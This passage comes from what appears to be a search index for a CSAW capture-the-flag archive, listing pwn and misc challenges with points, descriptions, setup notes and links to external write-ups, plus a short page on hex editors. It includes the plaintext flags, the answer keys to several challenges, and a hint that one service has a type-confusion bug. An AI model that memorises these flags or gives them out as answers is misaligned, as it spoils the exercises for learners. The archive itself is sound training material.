        }, 
        {
            "location": "/challenges/2016/pwn/thimblerig/#solution", 
            "text": "exploit.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/", 
            "text": "Hungman\n\n\nAuthor\n\n\nPoints\n\n\n300\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nSo I think you need to pwn this\n\n\nFlag\n\n\nflag{this_looks_like_its_a_well_hungman}\n\n\nSolution\n\n\nhungman.py", 
            "title": "Hungman"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#hungman", 
            "text": "", 
            "title": "Hungman"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#points", 
            "text": "300", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#description", 
            "text": "So I think you need to pwn this", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#flag", 
            "text": "flag{this_looks_like_its_a_well_hungman}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/Hungman/#solution", 
            "text": "hungman.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/", 
            "text": "Cybertronix64k (2)\n\n\nAuthor\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nWe found a manual for a strange old machine in our closet, as well as a ROM. There's another flag in memory... can you get us that?\nNote: The flag is marked with \nflag{XXXXX...}\n in memory, run against the remote instance to get the real flag!\n\nnc reversing.chal.csaw.io 1342\n\n\nFlag\n\n\nflag{off_by_one_pwning}\n\n\nSolution\n\n\nsolve.py", 
            "title": "CyberTronix64k"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#cybertronix64k-2", 
            "text": "", 
            "title": "Cybertronix64k (2)"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#description", 
            "text": "We found a manual for a strange old machine in our closet, as well as a ROM. There's another flag in memory... can you get us that?\nNote: The flag is marked with  flag{XXXXX...}  in memory, run against the remote instance to get the real flag! nc reversing.chal.csaw.io 1342", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#flag", 
            "text": "flag{off_by_one_pwning}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/pwn/CyberTronix64k/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/", 
            "text": "StringIPC\n\n\nAuthor\n\n\nCoppola\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nI've always wanted to try writing a kernel module. I think I covered all my bases but I'm not sure.\nIf your VM hangs, here is an IP to reboot your VM \nhttp://104.236.83.127/reboot\n\nPost Event Update\nStringIPC_Updated contains the exact source of the module running on the VM\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://itszn.com/blog/?p=21\n\n\n\n\nSetup\n\n\nStringIPC_427a532edb436a38d1e652bbc5732aa4.tgz\n\n\nStringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz", 
            "title": "StringIPC"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#stringipc", 
            "text": "", 
            "title": "StringIPC"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#author", 
            "text": "Coppola", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#description", 
            "text": "I've always wanted to try writing a kernel module. I think I covered all my bases but I'm not sure.\nIf your VM hangs, here is an IP to reboot your VM  http://104.236.83.127/reboot \nPost Event Update\nStringIPC_Updated contains the exact source of the module running on the VM", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#solution", 
            "text": "http://itszn.com/blog/?p=21", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/stringipc/#setup", 
            "text": "StringIPC_427a532edb436a38d1e652bbc5732aa4.tgz  StringIPC_Updated_3d38ffc5ca8932e5b60bde85df983ca7.tar.gz", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/", 
            "text": "boombox\n\n\nAuthor\n\n\nGaasedelen\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\n'The latest and greatest bumpin' new streaming service has just hit the web, have you seen it?\nAppJailLauncher.exe /network /key:key /port:4444 /timeout:120 ./boombox.exe'\nPassword: CSAW2015\nUPDATE: The challenge is hosted on \nhttp://40.117.40.124:4444/\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation500_boombox/boombox_writeup.md\n\n\n\n\nSetup\n\n\nboombox.7z", 
            "title": "Boombox"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#boombox", 
            "text": "", 
            "title": "boombox"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#author", 
            "text": "Gaasedelen", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#description", 
            "text": "'The latest and greatest bumpin' new streaming service has just hit the web, have you seen it?\nAppJailLauncher.exe /network /key:key /port:4444 /timeout:120 ./boombox.exe'\nPassword: CSAW2015\nUPDATE: The challenge is hosted on  http://40.117.40.124:4444/", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#solution", 
            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/exploitation500_boombox/boombox_writeup.md", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/boombox/#setup", 
            "text": "boombox.7z", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/", 
            "text": "Meme Shop\n\n\nAuthor\n\n\nCrowell\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nonly dwn knows what the meme is!\npwn this service to find out what only he knows!\ndwn: please tell us the meme....\n\n\nFlag\n\n\nflag{dwn: please tell us your meme. I\nm not going to stop asking}\n\n\nSolution\n\n\nSetup\n\n\nthis is a simple type confusion challenge\nyou have types \"meme\" and \"mrskeletal\"\nthe counter is an int8_t so you can overflow and f it up\nfirst you need ruby\nthen you need colorize\n\ngem install colorize\n\nthen you need to build the extension\n\n\nruby ./extconf.rb\nmake\n\n\n\n\n\nthen run the challenge with \nsocat\n or w/e\nmake sure that the flag is called \"flag\" because there is arb file read\nalso delete the .c file and do not provide the debug edition of the rb file", 
            "title": "Meme Shop"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#meme-shop", 
            "text": "", 
            "title": "Meme Shop"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#author", 
            "text": "Crowell", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#description", 
            "text": "only dwn knows what the meme is!\npwn this service to find out what only he knows!\ndwn: please tell us the meme....", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#flag", 
            "text": "flag{dwn: please tell us your meme. I m not going to stop asking}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/meme-shop/#setup", 
            "text": "this is a simple type confusion challenge\nyou have types \"meme\" and \"mrskeletal\"\nthe counter is an int8_t so you can overflow and f it up\nfirst you need ruby\nthen you need colorize gem install colorize \nthen you need to build the extension  ruby ./extconf.rb\nmake  then run the challenge with  socat  or w/e\nmake sure that the flag is called \"flag\" because there is arb file read\nalso delete the .c file and do not provide the debug edition of the rb file", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/", 
            "text": "Rhinoxorus\n\n\nAuthor\n\n\nEdwards\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwn\n\n\nDescription\n\n\nFlag\n\n\ncc21fe41b44ba70d0e6978c840698601\n\n\nSolution\n\n\nSetup", 
            "title": "Rhinoxorus"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#rhinoxorus", 
            "text": "", 
            "title": "Rhinoxorus"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#author", 
            "text": "Edwards", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#category", 
            "text": "Pwn", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#flag", 
            "text": "cc21fe41b44ba70d0e6978c840698601", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/rhinoxorus/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/", 
            "text": "CreditForCredits\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n25\n\n\nCategory\n\n\nPwnadventureZ\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Credit for Credits"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#creditforcredits", 
            "text": "", 
            "title": "CreditForCredits"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#points", 
            "text": "25", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#category", 
            "text": "PwnadventureZ", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/creditforcredits/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/", 
            "text": "GreetingsEarthling\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n25\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription:**\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Greetings Earthlings"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#greetingsearthling", 
            "text": "", 
            "title": "GreetingsEarthling"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#points", 
            "text": "25", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#category", 
            "text": "PwnAdventureZ", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description:**"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/greetingsearthling/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/", 
            "text": "HiddenCave\n\n\nAuthor\n\n\nWiens\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nPoints\n\n\n150\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Hidden Cave"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#hiddencave", 
            "text": "", 
            "title": "HiddenCave"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#category", 
            "text": "PwnAdventureZ", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/hiddencave/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/", 
            "text": "QuarantineBreaker\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n250\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Quarentine Breaker"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#quarantinebreaker", 
            "text": "", 
            "title": "QuarantineBreaker"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#category", 
            "text": "PwnAdventureZ", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/quarantinebreaker/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/", 
            "text": "blox\n\n\nAuthor\n\n\nWiens\n\n\nCategory\n\n\nPwnadventurez\n\n\nPoints\n\n\n250\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Blox"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#blox", 
            "text": "", 
            "title": "blox"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#category", 
            "text": "Pwnadventurez", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#points", 
            "text": "250", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/blox/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/", 
            "text": "get_flag\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n400\n\n\nCategory\n\n\nPwnadventurez\n\n\nDescription\n\n\nThis challenge can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Get Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#get_flag", 
            "text": "", 
            "title": "get_flag"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#category", 
            "text": "Pwnadventurez", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#description", 
            "text": "This challenge can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/get-flag/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/", 
            "text": "memory_disclosure_flag\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n500\n\n\nCategory\n\n\nPwnAdventureZ\n\n\nDescription\n\n\nThis flag can be found in PwnAdventureZ\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttp://andrewdutcher.com/view/21/pwn-adventure-z---writeup\n\n\n\n\nSetup\n\n\nPwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Memory Disclosure Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#memory_disclosure_flag", 
            "text": "", 
            "title": "memory_disclosure_flag"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#points", 
            "text": "500", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#category", 
            "text": "PwnAdventureZ", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#description", 
            "text": "This flag can be found in PwnAdventureZ", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#solution", 
            "text": "http://andrewdutcher.com/view/21/pwn-adventure-z---writeup", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/pwn/memory-disclosure-flag/#setup", 
            "text": "PwnAdventureZ_4dd76ae148461e47883790c3b56c7eae.zip", 
            "title": "Setup"
        }, 
        {
            "location": "/miscellaneous/introduction/", 
            "text": "Miscellaneous\n\n\nSome tools that are useful:\n\n\n\n\nTools", 
            "title": "Introduction"
        }, 
        {
            "location": "/miscellaneous/introduction/#miscellaneous", 
            "text": "Some tools that are useful:   Tools", 
            "title": "Miscellaneous"
        }, 
        {
            "location": "/miscellaneous/what-is-in-a-hackers-toolkit/", 
            "text": "A Hacker's Toolkit\n\n\nJust like every lockpic needs a lockpicking kit, a hacker needs tools in order to hack.\n\n\nHex Editor\n\n\nA hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A \nlist of editors\n can be found on the forensics Wiki. You can download one and install it on your system.\n\n\nExample\n\n\nOpen fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile \n Open\u201d option or a simple drag and drop.)\n\n\n\n\nWhen you open fileA.jpg in your hex editor, you should see something similar to this:\n\n\n\n\nYour hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte.", 
            "title": "What is in a Hacker's Toolkit"
        }, 
        {
            "location": "/miscellaneous/what-is-in-a-hackers-toolkit/#a-hackers-toolkit", 
            "text": "Just like every lockpic needs a lockpicking kit, a hacker needs tools in order to hack.", 
            "title": "A Hacker's Toolkit"
        }, 
        {
            "location": "/miscellaneous/what-is-in-a-hackers-toolkit/#hex-editor", 
            "text": "A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A  list of editors  can be found on the forensics Wiki. You can download one and install it on your system.", 
            "title": "Hex Editor"
        }, 
        {
            "location": "/miscellaneous/what-is-in-a-hackers-toolkit/#example", 
            "text": "Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile   Open\u201d option or a simple drag and drop.)   When you open fileA.jpg in your hex editor, you should see something similar to this:   Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte.", 
            "title": "Example"
        }, 
        {
            "location": "/challenges/2017/misc/serial/", 
            "text": "Serial\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nFlag\n\n\nflag{@n_int3rface_betw33n_data_term1nal_3quipment_and_d@t@_circuit-term1nating_3quipment}\n\n\nSolution\n\n\nsolver.py\n\n\nPremise\n\n\nBasic programming challenge that sends data sorta like rs232.", 
            "title": "Serial"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#serial", 
            "text": "", 
            "title": "Serial"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#flag", 
            "text": "flag{@n_int3rface_betw33n_data_term1nal_3quipment_and_d@t@_circuit-term1nating_3quipment}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#solution", 
            "text": "solver.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2017/misc/serial/#premise", 
            "text": "Basic programming challenge that sends data sorta like rs232.", 
            "title": "Premise"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/", 
            "text": "CVV\n\n\nAuthor\n\n\nOskar Wirga\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nHey fam, you got CVV? I need some CVV!\n\n\nFlag\n\n\nflag{ch3ck-exp3rian-dat3-b3for3-us3}\n\n\nSolution\n\n\nsolve.py", 
            "title": "CVV"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#cvv", 
            "text": "", 
            "title": "CVV"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#author", 
            "text": "Oskar Wirga", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#description", 
            "text": "Hey fam, you got CVV? I need some CVV!", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#flag", 
            "text": "flag{ch3ck-exp3rian-dat3-b3for3-us3}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2017/misc/cvv/#solution", 
            "text": "solve.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/", 
            "text": "Coinslot\n\n\nAuthor\n\n\nJosh Hofing\n\n\nPoints\n\n\n25\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\n#Hope #Change #Obama2008\n\n\nFlag\n\n\nflag{started-from-the-bottom-now-my-whole-team-fucking-here}\n\n\nSolution\n\n\ncoins.py", 
            "title": "Coinslot"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#coinslot", 
            "text": "", 
            "title": "Coinslot"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#author", 
            "text": "Josh Hofing", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#points", 
            "text": "25", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#description", 
            "text": "#Hope #Change #Obama2008", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#flag", 
            "text": "flag{started-from-the-bottom-now-my-whole-team-fucking-here}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2016/misc/coinslot/#solution", 
            "text": "coins.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/misc/1337/", 
            "text": "1337\n\n\nAuthor\n\n\nStortz\n\n\nPoints\n\n\n150\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nBring me a receipt with the grand total (items + tax) of $13.37. There are some restrictions:\n- The receipt must be from within 1/2 mile of 6 MetroTech.\n- The receipt must be printed on receipt paper.\n- The receipt must be itemized with each item\u2019s price shown\n- No more than 4 items can be used to equal $13.37.\n- The purchase must be during the hours of the competition.\n- You must show the purchased items to the judges.\n- Tips, discretionary costs, and haggled costs do not count. Ideally every item would have a price sticker on it.\n- Flea Markets are not allowed.\n- Quantities are whole numbers. You can't use something measured by weight or equivalent.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
            "title": 1337
        }, 
        {
            "location": "/challenges/2015/misc/1337/#1337", 
            "text": "", 
            "title": "1337"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#author", 
            "text": "Stortz", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#description", 
